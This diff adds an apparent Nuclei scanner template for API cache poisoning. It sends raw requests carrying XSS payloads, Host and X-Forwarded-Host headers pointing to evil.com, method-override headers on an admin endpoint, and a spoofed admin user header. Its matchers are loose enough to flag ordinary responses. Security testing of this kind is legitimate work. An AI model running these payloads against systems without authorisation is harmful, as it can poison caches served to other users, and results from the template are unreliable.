@@ -1,0 +1,163 @@
+id: api-cache-poisoning-parameter
+
+info:
+  name: API Cache Poisoning - Parameter Manipulation Attack
+  author: elite-red-team
+  severity: high
+  description: |
+    Advanced API cache poisoning template targeting cache key manipulation vulnerabilities.
+    Exploits cache implementation flaws to poison cached responses and achieve
+    privilege escalation, data exposure, or persistent XSS attacks.
+  reference:
+    - https://portswigger.net/research/practical-web-cache-poisoning
+    - https://owasp.org/www-community/attacks/Cache_Poisoning
+    - https://blog.cloudflare.com/cache-poisoning-protection/
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N
+    cvss-score: 8.7
+    cwe-id: CWE-444
+  tags: api,cache-poisoning,parameter-manipulation,web-cache,bypass,red-team
+
+http:
+  - raw:
+      # Test 1: Cache key confusion with unkeyed parameters
+      - |
+        GET /api/user/profile?user_id=123&callback=alert(1) HTTP/1.1
+        Host: {{Hostname}}
+        X-Forwarded-Host: evil.com
+        User-Agent: Mozilla/5.0 (compatible; CachePoisoner/1.0)
+        Accept: application/json
+        
+      # Test 2: Cache poisoning via Host header manipulation
+      - |
+        GET /api/config.json HTTP/1.1
+        Host: evil.com
+        X-Original-Host: {{Hostname}}
+        X-Forwarded-Host: evil.com
+        X-Host: evil.com
+        Accept: application/json
+        
+      # Test 3: Parameter cloaking with cache bypass
+      - |
+        GET /api/data?legitimate=true&utm_source=<script>alert('XSS')</script> HTTP/1.1
+        Host: {{Hostname}}
+        X-Cache-Bypass: true
+        Vary: X-Cache-Bypass
+        Accept: application/json
+        
+      # Test 4: Cache poisoning with HTTP method override
+      - |
+        GET /api/admin/settings HTTP/1.1
+        Host: {{Hostname}}
+        X-HTTP-Method-Override: POST
+        X-Original-Method: GET
+        X-Method-Override: DELETE
+        Accept: application/json
+        
+      # Test 5: Cache key normalization bypass
+      - |
+        GET /api/search?q=normal&X-Evil-Header=<img src=x onerror=alert(1)> HTTP/1.1
+        Host: {{Hostname}}
+        X-Forwarded-Proto: https
+        X-Forwarded-For: 127.0.0.1
+        Accept: application/json
+        
+      # Test 6: Cache poisoning with parameter pollution
+      - |
+        GET /api/user?id=1&callback=jsonp_callback&id=2&callback=alert(document.domain) HTTP/1.1
+        Host: {{Hostname}}
+        X-Cache-Control: no-cache
+        Pragma: no-cache
+        Accept: application/javascript
+        
+      # Test 7: Cache poisoning via Accept header manipulation
+      - |
+        GET /api/content HTTP/1.1
+        Host: {{Hostname}}
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+        Accept-Encoding: gzip, deflate
+        X-Requested-With: <script>alert('Cached XSS')</script>
+        
+      # Test 8: Cache poisoning with custom headers
+      - |
+        GET /api/profile?user=victim HTTP/1.1
+        Host: {{Hostname}}
+        X-Custom-Header: "><script>alert('Cache Poisoned')</script>
+        X-Forwarded-User: admin
+        X-Real-IP: 192.168.1.1
+        Accept: application/json
+        
+      # Test 9: Cache poisoning with URL parameter encoding
+      - |
+        GET /api/redirect?url=https://example.com&next=%6A%61%76%61%73%63%72%69%70%74%3A%61%6C%65%72%74%28%31%29 HTTP/1.1
+        Host: {{Hostname}}
+        Referer: https://{{Hostname}}
+        Accept: application/json
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 201
+          - 302
+          - 304
+          
+      - type: word
+        part: header
+        words:
+          - "X-Cache: HIT"
+          - "X-Cache-Status: HIT"
+          - "CF-Cache-Status: HIT"
+          - "Cache-Control:"
+          - "X-Served-By:"
+          - "X-Cache-Lookup:"
+        condition: or
+        
+      - type: word
+        part: body
+        words:
+          - "<script>"
+          - "alert("
+          - "javascript:"
+          - "onerror="
+          - "onload="
+          - "eval("
+          - "document.domain"
+          - "document.cookie"
+          - "evil.com"
+          - "callback="
+        condition: or
+        
+      - type: regex
+        part: response
+        regex:
+          - '(?i)(x-cache|cache-control|expires|etag):\s*[^\r\n]*'
+          - '(?i)<script[^>]*>.*?</script>'
+          - '(?i)javascript:[^"\s]*'
+          - '(?i)on\w+\s*=\s*["\'][^"\']*["\']'
+        condition: or
+
+    extractors:
+      - type: regex
+        name: cache_headers
+        part: header
+        regex:
+          - '(?i)(X-Cache[^:]*|Cache-Control|Expires|ETag):\s*([^\r\n]+)'
+          
+      - type: regex
+        name: injected_payload
+        part: body
+        regex:
+          - '<script[^>]*>([^<]*)</script>'
+          - 'javascript:([^"\s]*)'
+          - 'alert\(([^)]*)\)'
+          
+      - type: kval
+        part: header
+        kval:
+          - X-Cache
+          - X-Cache-Status
+          - CF-Cache-Status
+          - Cache-Control
+          - Vary
